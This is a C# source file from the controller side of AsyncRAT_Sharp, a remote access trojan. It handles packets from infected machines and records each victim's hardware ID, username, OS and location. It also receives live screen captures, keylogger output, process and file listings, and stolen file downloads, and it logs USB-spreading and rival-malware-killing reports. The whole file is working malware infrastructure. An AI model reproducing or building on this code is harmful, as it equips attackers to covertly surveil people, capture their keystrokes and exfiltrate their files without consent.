﻿using AsyncRAT_Sharp.Sockets;
using System.Windows.Forms;
using AsyncRAT_Sharp.MessagePack;
using System;
using System.Diagnostics;
using System.Drawing;
using AsyncRAT_Sharp.Forms;
using System.IO;
using cGeoIp;

namespace AsyncRAT_Sharp.Handle_Packet
{
    class HandlePacket
    {
        private static readonly cGeoMain cNewGeoUse = new cGeoMain();
        public static void Read(object Obj)
        {
            try
            {
                object[] array = Obj as object[];
                byte[] data = (byte[])array[0];
                Clients client = (Clients)array[1];
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes(data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "ClientInfo":
                        if (Program.form1.listView1.InvokeRequired)
                        {
                            Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                            {
                                client.LV = new ListViewItem();
                                client.LV.Tag = client;
                                client.LV.Text = string.Format("{0}:{1}", client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0], client.ClientSocket.LocalEndPoint.ToString().Split(':')[1]);
                                string[] ipinf = cNewGeoUse.GetIpInf(client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
                                client.LV.SubItems.Add(ipinf[1]);
                                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
                                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Performance").AsString);
                                client.LV.ToolTipText = unpack_msgpack.ForcePathObject("Path").AsString;
                                client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
                                Program.form1.listView1.BeginUpdate();
                                Program.form1.listView1.Items.Insert(0, client.LV);
                                Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                                Program.form1.listView1.EndUpdate();
                            }));
                            lock (Settings.Online)
                            {
                                Settings.Online.Add(client);
                            }
                            HandleLogs.Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} connected successfully", Color.Green);
                        }
                        break;

                    case "Ping":
                        {
                            if (Program.form1.listView1.InvokeRequired)
                            {
                                Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                                {
                                    if (client.LV != null)
                                    {
                                        client.LV.SubItems[Program.form1.lv_prefor.Index].Text = unpack_msgpack.ForcePathObject("Message").AsString;
                                    }
                                }));
                            }
                        }
                        break;

                    case "Logs":
                        {
                            HandleLogs.Addmsg(unpack_msgpack.ForcePathObject("Message").AsString, Color.Black);
                        }
                        break;

                    case "thumbnails":
                        {
                            if (Program.form1.listView3.InvokeRequired)
                            {
                                Program.form1.listView3.BeginInvoke((MethodInvoker)(() =>
                                {
                                    if (client.LV2 == null)
                                    {
                                        client.LV2 = new ListViewItem();
                                        client.LV2.Text = string.Format("{0}:{1}", client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0], client.ClientSocket.LocalEndPoint.ToString().Split(':')[1]);
                                        client.LV2.ToolTipText = client.ID;
                                        using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                                        {
                                            Program.form1.imageList1.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
                                            client.LV2.ImageKey = client.ID;
                                            Program.form1.listView3.BeginUpdate();
                                            Program.form1.listView3.Items.Insert(0,client.LV2);
                                            Program.form1.listView3.EndUpdate();
                                        }
                                    }
                                    else
                                    {
                                        using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                                        {
                                            Program.form1.listView3.BeginUpdate();
                                            Program.form1.imageList1.Images.RemoveByKey(client.ID);
                                            Program.form1.imageList1.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
                                            Program.form1.listView3.EndUpdate();
                                        }
                                    }
                                }));
                            }
                        }
                        break;

                    case "BotKiller":
                        {
                            HandleLogs.Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} found {unpack_msgpack.ForcePathObject("Count").AsString} malwares and killed them successfully", Color.Orange);
                        }
                        break;


                    case "usbSpread":
                        {
                            HandleLogs.Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} found {unpack_msgpack.ForcePathObject("Count").AsString} USB drivers and spreaded them successfully", Color.Purple);
                        }
                        break;

                    case "Received":
                        {
                            if (Program.form1.listView1.InvokeRequired)
                            {
                                Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                                {
                                    client.LV.ForeColor = Color.Empty;
                                }));
                            }
                        }
                        break;

                    case "remoteDesktop":
                        {
                            if (Program.form1.InvokeRequired)
                            {
                                Program.form1.BeginInvoke((MethodInvoker)(() =>
                                {
                                    FormRemoteDesktop RD = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
                                    try
                                    {
                                        if (RD != null)
                                        {
                                            if (RD.C2 == null)
                                            {
                                                RD.C2 = client;
                                                RD.timer1.Start();
                                            }
                                            byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                                            Bitmap decoded = RD.decoder.DecodeData(new MemoryStream(RdpStream));

                                            if (RD.RenderSW.ElapsedMilliseconds >= (1000 / 20))
                                            {
                                                RD.pictureBox1.Image = (Bitmap)decoded;
                                                RD.RenderSW = Stopwatch.StartNew();
                                            }
                                            RD.FPS++;
                                            if (RD.sw.ElapsedMilliseconds >= 1000)
                                            {
                                                RD.Text = "RemoteDesktop:" + client.ID + "    FPS:" + RD.FPS + "    Screen:" + decoded.Width + " x " + decoded.Height + "    Size:" + Methods.BytesToString(RdpStream.Length);
                                                RD.FPS = 0;
                                                RD.sw = Stopwatch.StartNew();
                                            }
                                        }
                                        else
                                        {
                                            client.Disconnected();
                                            return;
                                        }
                                    }
                                    catch (Exception ex) { Debug.WriteLine(ex.Message); }
                                }));
                            }
                        }
                        break;

                    case "processManager":
                        {
                            if (Program.form1.InvokeRequired)
                            {
                                Program.form1.BeginInvoke((MethodInvoker)(() =>
                                {
                                    FormProcessManager PM = (FormProcessManager)Application.OpenForms["processManager:" + client.ID];
                                    if (PM != null)
                                    {
                                        PM.listView1.Items.Clear();
                                        string msgUnpack = unpack_msgpack.ForcePathObject("Message").AsString;
                                        string processLists = msgUnpack.ToString();
                                        string[] _NextProc = processLists.Split(new[] { "-=>" }, StringSplitOptions.None);
                                        for (int i = 0; i < _NextProc.Length; i++)
                                        {
                                            if (_NextProc[i].Length > 0)
                                            {
                                                ListViewItem lv = new ListViewItem();
                                                lv.Text = Path.GetFileName(_NextProc[i]);
                                                lv.SubItems.Add(_NextProc[i + 1]);
                                                lv.ToolTipText = _NextProc[i];
                                                Image im = Image.FromStream(new MemoryStream(Convert.FromBase64String(_NextProc[i + 2])));
                                                PM.imageList1.Images.Add(_NextProc[i + 1], im);
                                                lv.ImageKey = _NextProc[i + 1];
                                                PM.listView1.Items.Add(lv);
                                            }
                                            i += 2;
                                        }
                                    }
                                }));
                            }
                        }
                        break;


                    case "socketDownload":
                        {
                            switch (unpack_msgpack.ForcePathObject("Command").AsString)
                            {
                                case "pre":
                                    {
                                        if (Program.form1.InvokeRequired)
                                        {
                                            Program.form1.BeginInvoke((MethodInvoker)(() =>
                                            {

                                                string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
                                                string file = unpack_msgpack.ForcePathObject("File").AsString;
                                                string size = unpack_msgpack.ForcePathObject("Size").AsString;
                                                FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + dwid];
                                                if (SD != null)
                                                {
                                                    SD.C = client;
                                                    SD.labelfile.Text = Path.GetFileName(file);
                                                    SD.dSize = Convert.ToInt64(size);
                                                    SD.timer1.Start();
                                                }
                                            }));
                                        }
                                    }
                                    break;

                                case "save":
                                    {
                                        if (Program.form1.InvokeRequired)
                                        {
                                            Program.form1.BeginInvoke((MethodInvoker)(() =>
                                            {
                                                string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
                                                FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + dwid];
                                                if (SD != null)
                                                {
                                                    if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", ""))))
                                                        Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "")));

                                                    unpack_msgpack.ForcePathObject("File").SaveBytesToFile(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "") + "\\" + unpack_msgpack.ForcePathObject("Name").AsString));
                                                }
                                            }));
                                        }
                                    }
                                    break;
                            }
                            break;
                        }

                    case "keyLogger":
                        {
                            if (Program.form1.InvokeRequired)
                            {
                                Program.form1.BeginInvoke((MethodInvoker)(() =>
                                {
                                    FormKeylogger KL = (FormKeylogger)Application.OpenForms["keyLogger:" + client.ID];
                                    if (KL != null)
                                    {
                                        KL.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("Log").GetAsString());
                                    }
                                    else
                                    {
                                        MsgPack msgpack = new MsgPack();
                                        msgpack.ForcePathObject("Packet").AsString = "keyLogger";
                                        msgpack.ForcePathObject("isON").AsString = "false";
                                        client.BeginSend(msgpack.Encode2Bytes());
                                    }
                                }));
                            }
                            break;
                        }

                    case "fileManager":
                        {
                            switch (unpack_msgpack.ForcePathObject("Command").AsString)
                            {
                                case "getDrivers":
                                    {
                                        if (Program.form1.InvokeRequired)
                                        {
                                            Program.form1.BeginInvoke((MethodInvoker)(() =>
                                            {
                                                FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
                                                if (FM != null)
                                                {
                                                    FM.listView1.Items.Clear();
                                                    string[] driver = unpack_msgpack.ForcePathObject("Driver").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
                                                    for (int i = 0; i < driver.Length; i++)
                                                    {
                                                        if (driver[i].Length > 0)
                                                        {
                                                            ListViewItem lv = new ListViewItem();
                                                            lv.Text = driver[i];
                                                            lv.ToolTipText = driver[i];
                                                            if (driver[i + 1] == "Fixed") lv.ImageIndex = 1;
                                                            else if (driver[i + 1] == "Removable") lv.ImageIndex = 2;
                                                            else lv.ImageIndex = 1;
                                                            FM.listView1.Items.Add(lv);
                                                        }
                                                        i += 1;
                                                    }
                                                }
                                            }));
                                        }
                                    }
                                    break;

                                case "getPath":
                                    {
                                        if (Program.form1.InvokeRequired)
                                        {
                                            Program.form1.BeginInvoke((MethodInvoker)(() =>
                                            {
                                                FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
                                                if (FM != null)
                                                {
                                                    FM.listView1.Items.Clear();
                                                    FM.listView1.Groups.Clear();
                                                    string[] _folder = unpack_msgpack.ForcePathObject("Folder").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
                                                    ListViewGroup groupFolder = new ListViewGroup("Folders");
                                                    FM.listView1.Groups.Add(groupFolder);
                                                    int numFolders = 0;
                                                    for (int i = 0; i < _folder.Length; i++)
                                                    {
                                                        if (_folder[i].Length > 0)
                                                        {
                                                            ListViewItem lv = new ListViewItem();
                                                            lv.Text = _folder[i];
                                                            lv.ToolTipText = _folder[i + 1];
                                                            lv.Group = groupFolder;
                                                            lv.ImageIndex = 0;
                                                            FM.listView1.Items.Add(lv);
                                                            numFolders += 1;
                                                        }
                                                        i += 1;

                                                    }

                                                    string[] _file = unpack_msgpack.ForcePathObject("File").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
                                                    ListViewGroup groupFile = new ListViewGroup("Files");
                                                    FM.listView1.Groups.Add(groupFile);
                                                    int numFiles = 0;
                                                    for (int i = 0; i < _file.Length; i++)
                                                    {
                                                        if (_file[i].Length > 0)
                                                        {
                                                            ListViewItem lv = new ListViewItem();
                                                            lv.Text = Path.GetFileName(_file[i]);
                                                            lv.ToolTipText = _file[i + 1];
                                                            Image im = Image.FromStream(new MemoryStream(Convert.FromBase64String(_file[i + 2])));
                                                            FM.imageList1.Images.Add(_file[i + 1], im);
                                                            lv.ImageKey = _file[i + 1];
                                                            lv.Group = groupFile;
                                                            lv.SubItems.Add(Methods.BytesToString(Convert.ToInt64(_file[i + 3])));
                                                            FM.listView1.Items.Add(lv);
                                                            numFiles += 1;
                                                        }
                                                        i += 3;
                                                    }
                                                    FM.toolStripStatusLabel2.Text = $"       Folder[{numFolders.ToString()}]   Files[{numFiles.ToString()}]";
                                                }
                                            }));
                                        }
                                    }
                                    break;
                            }
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
            //GC.Collect();
            //GC.WaitForPendingFinalizers();
        }
    }
}